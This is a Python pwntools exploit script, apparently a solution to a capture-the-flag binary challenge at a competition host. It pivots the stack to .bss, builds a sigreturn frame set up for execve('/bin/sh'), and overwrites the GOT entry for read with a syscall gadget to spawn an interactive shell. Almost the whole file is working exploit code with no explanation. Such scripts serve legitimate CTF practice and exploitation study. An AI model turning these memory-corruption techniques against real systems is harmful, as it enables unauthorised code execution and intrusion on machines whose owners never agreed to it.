#!/usr/bin/env python3
from pwn import *
from ctypes import CDLL
import time
from subprocess import Popen
from pwncli import IO_FILE_plus_struct

# =========================================================
#                          SETUP                         
# =========================================================
exe = './main_patched'
elf = context.binary = ELF(exe, checksec=True)
libc = elf.libc
context.log_level = 'debug'
context.terminal = ["tmux", "splitw", "-h", "-p", "65"]
host, port = "chal.wwctf.com", 7003


gdbscript = '''
init-pwndbg
b *main+62
c
'''.format(**locals())

def initialize(argv=[]):
    global pid
    if args.QEMU:
        if args.GDB:
            return process(["qemu-aarch64", "-g", "5000", "-L", "/usr/aarch64-linux-gnu", exe] + argv)
        else:
            return process(["qemu-aarch64", "-L", "/usr/aarch64-linux-gnu", exe] + argv)
    elif args.DOCKER:
        p = remote("localhost", 5000)
        time.sleep(1)
        pid = process(["pgrep", "-fx", "/app/run"]).recvall().strip().decode()
        return p
    elif args.REMOTE:
        context.log_level = 'info'
        return remote(host, port, ssl=False)
    elif args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript)
    else:
        return process([exe] + argv, aslr=False)

def debug():
    global gdbscript, pid
    if args.QEMU:
        gdb_args = ["tmux", "splitw", "-h", "-p", "65", "gdb"]
        for cmd in [item for line in gdbscript.strip().splitlines() if (item := line.strip())]:
            gdb_args.extend(["-ex", cmd])
        Popen(gdb_args)
    elif args.DOCKER:
        gdbscript = f'''
        init-pwndbg
        set sysroot /proc/{pid}/root
        b *main+62
        c
        '''.format(**locals())        
        attach(int(pid), gdbscript=gdbscript, sysroot=f"/proc/{pid}/root", exe='main_patched')
    else:
        attach(io, gdbscript=gdbscript)


# =========================================================
#                         EXPLOITS
# =========================================================
def exploit():
    global io
    io = initialize()
    offset = 0x100

    with log.progress("Preparing Pivoting to .bss & Fake Frame"), context.silent:
        # Gadgets
        pop_rbp = next(elf.search(asm("pop rbp ; ret")))
        leave = next(elf.search(asm("leave ; ret")))
        pop_rbp = next(elf.search(asm("pop rbp ; ret")))
        syscall = next(elf.search(asm("syscall")))

        payload = flat({offset:[elf.got["read"] + 0x100 + 0x100, elf.sym["main"] + 31]}, filler=b"A")
        io.send(payload)

        sleep(1)

        frame = SigreturnFrame()
        frame.rax = constants.SYS_execve            # syscall number for execve()
        frame.rdi = elf.got["read"] + 0x8         # pointer to "/bin/sh" 
        frame.rsi = 0             # NULL
        frame.rdx = 0             # NULL
        frame.rip = syscall        # syscall instruction
    log.info("Frame length: %#x", len(bytes(frame)))


    with log.progress("Sending Fake Frame and preparing GOT read RIP"), context.silent:
        # RBP + RIP
        payload2 = flat({0:[0x100 + constants.SYS_rt_sigreturn, elf.sym["main"]+31, bytes(frame)[0x8:0xf8]],
                    offset:[elf.got["read"] + 0x100, elf.sym["main"] + 31]}, filler=b"\x00")
        io.send(payload2)
        sleep(1)

    with log.progress("Overwriting got read to syscall & get shell wi"), context.silent:
        # Overwrite read to syscall
        io.send(p64(syscall) + p64(u64(b"/bin/sh\0")))
    io.interactive()

if __name__ == '__main__':
    exploit()
